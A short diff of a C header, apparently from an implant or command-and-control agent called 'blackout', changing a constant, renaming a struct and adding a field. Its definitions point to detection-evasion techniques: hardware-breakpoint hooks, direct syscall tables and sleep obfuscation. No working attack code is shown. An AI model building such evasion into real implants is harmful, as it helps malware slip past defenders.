@@ -17,7 +17,7 @@
 #include <command.h>
 #include <communication.h>
 
-#define BLACKOUT_COMMAND_LENGTH 10
+#define BLACKOUT_COMMAND_LENGTH 20
 #define BLACKOUT_MAGIC_VALUE    0x6F626C76
 //
 // blackout instances
@@ -58,7 +58,7 @@ typedef struct _HWBP {
     BYTE             Ret[1];
 } HWBP, *PHWBP;
 
-typedef struct SYS_TBL {
+typedef struct _SYS_TBL {
     ULONG Ssn;
     ULONG SysHash;
     PVOID SysAddr;
@@ -309,6 +309,7 @@ typedef struct _INSTANCE {
         HWBP      Hwbp;
         SYSC      Syscall;
         SLEEP_OBF SleepObf;
+        UINT32    bkApi;
     } Blackout;
 
     struct {
